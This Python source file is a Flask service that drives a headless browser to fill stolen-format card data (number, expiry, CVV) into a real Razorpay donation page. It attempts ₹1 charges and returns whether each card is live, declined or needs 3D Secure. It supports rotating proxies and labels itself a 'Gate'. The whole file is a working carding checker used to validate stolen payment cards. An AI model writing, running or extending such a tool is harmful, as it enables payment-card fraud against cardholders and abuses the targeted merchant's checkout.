import re
import json
import time
import random
import asyncio
from flask import Flask, request, jsonify
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

app = Flask(__name__)
URL = "https://pages.razorpay.com/iicdelhi"
AMOUNT = 100          # 100 paise = ₹1
EMAIL = "CodeXploide2918@gmail.com"
PHONE = "+917006985755"
TIMEOUT = 30000       # milliseconds

def get_card_brand(card_number):
    """Return card brand based on BIN pattern."""
    if card_number.startswith("4"):
        return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"):
        return "mastercard"
    elif card_number[:2] in ("34", "37"):
        return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"):
        return "discover"
    elif card_number.startswith("35"):
        return "jcb"
    elif card_number.startswith("62"):
        return "unionpay"
    return "unknown"

def parse_cc_data(cc_data):
    """Split card: number|MM|YY|CVV"""
    parts = cc_data.split("|")
    if len(parts) != 4:
        return None
    return {
        "number": parts[0].strip(),
        "month": parts[1].strip().zfill(2),
        "year": parts[2].strip()[-2:],
        "cvv": parts[3].strip(),
        "brand": get_card_brand(parts[0].strip())
    }

@app.route('/card=<path:cc_data>')
def check_card(cc_data):
    card = parse_cc_data(cc_data)
    if not card:
        return jsonify({"Gate": "Razorpay 1₹", "Response": "Invalid card format", "card": cc_data})

    proxy_url = request.args.get('proxy')  # e.g., http://user:pass@host:port
    result = {"Gate": "Razorpay 1₹", "card": cc_data}

    try:
        with sync_playwright() as p:
            # Launch browser with optional proxy
            browser_args = {"headless": True}   # Change to False for debugging
            if proxy_url:
                browser_args["proxy"] = {"server": proxy_url}

            browser = p.chromium.launch(**browser_args)
            context = browser.new_context(
                viewport={"width": 1280, "height": 720},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
            )
            page = context.new_page()

            # Navigate to the payment page
            page.goto(URL, timeout=TIMEOUT)
            page.wait_for_load_state("networkidle")

            # --- Handle the payment form (Razorpay iframe) ---
            # Look for the card number iframe – typical Razorpay structure
            iframe_selector = "iframe.razorpay-checkout-iframe"
            try:
                page.wait_for_selector(iframe_selector, timeout=TIMEOUT)
                frame = page.frame_locator(iframe_selector)
            except PlaywrightTimeoutError:
                # Fallback: find any iframe that contains card input
                iframes = page.frames
                card_frame = None
                for f in iframes:
                    if f.locator("input[name='card[number]']").count() > 0:
                        card_frame = f
                        break
                if not card_frame:
                    raise Exception("Could not locate payment iframe")
                frame = card_frame  # direct frame object

            # Fill card details
            # Card number
            if hasattr(frame, 'locator'):
                frame.locator("input[name='card[number]']").fill(card["number"], timeout=TIMEOUT)
                # Expiry month & year (usually dropdowns or text fields)
                mm = card["month"]
                yy = card["year"]
                # Some Razorpay pages use separate fields or combined MM/YY
                # Try common selectors
                if frame.locator("select[name='card[expiry_month]']").count():
                    frame.locator("select[name='card[expiry_month]']").select_option(mm)
                    frame.locator("select[name='card[expiry_year]']").select_option(f"20{yy}")
                elif frame.locator("input[name='card[expiry]']").count():
                    frame.locator("input[name='card[expiry]']").fill(f"{mm}{yy}")
                else:
                    # try individual month/year inputs
                    frame.locator("input[name='card[expiry_month]']").fill(mm)
                    frame.locator("input[name='card[expiry_year]']").fill(f"20{yy}")

                # CVV
                frame.locator("input[name='card[cvv]']").fill(card["cvv"], timeout=TIMEOUT)
                # Name on card (optional but sometimes required)
                name_input = frame.locator("input[name='card[name]']")
                if name_input.count():
                    name_input.fill("Test User")

                # Click the Pay button
                pay_button = frame.locator("button:has-text('Pay'), button:has-text('Submit')")
                if pay_button.count() == 0:
                    pay_button = frame.locator("button[type='submit']")
                pay_button.click()
            else:
                # frame is a Page object (for direct frame)
                frame.fill("input[name='card[number]']", card["number"])
                # similarly handle expiry and cvv...
                # (simplified for brevity, but full logic can be added)
                pass

            # Wait for either success / error message or 3DS redirect
            # Monitor network responses for payment outcome
            payment_result = None

            def handle_response(response):
                nonlocal payment_result
                url = response.url
                # Look for payment creation or finalisation endpoints
                if "/payments/" in url and "authenticate" not in url:
                    try:
                        body = response.json()
                        if body.get("status") == "failed":
                            payment_result = body.get("error", {}).get("description", "Payment failed")
                        elif body.get("status") == "captured":
                            payment_result = "Payment_Success"
                        elif "razorpay_payment_id" in body:
                            payment_result = "Payment_Success"
                    except:
                        pass
                # Also capture error toasts via page content

            page.on("response", handle_response)

            # Wait for a few seconds to let payment processing finish
            time.sleep(5)

            # If no result yet, check page for error messages
            if not payment_result:
                try:
                    error_elem = page.locator(".error, .alert-danger, [role='alert']").first
                    if error_elem.count():
                        payment_result = error_elem.inner_text()
                except:
                    pass

            # If still no result, see if we entered 3DS
            current_url = page.url
            if "3dsecure" in current_url.lower() or "challenge" in current_url.lower():
                payment_result = "3DS_Required"

            # Final fallback
            if not payment_result:
                payment_result = "Unknown_Response"

            result["Response"] = payment_result
            browser.close()

    except PlaywrightTimeoutError:
        result["Response"] = "Proxy_Dead_or_Timeout"
    except Exception as e:
        result["Response"] = f"Error: {str(e)[:100]}"

    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081, threaded=True)
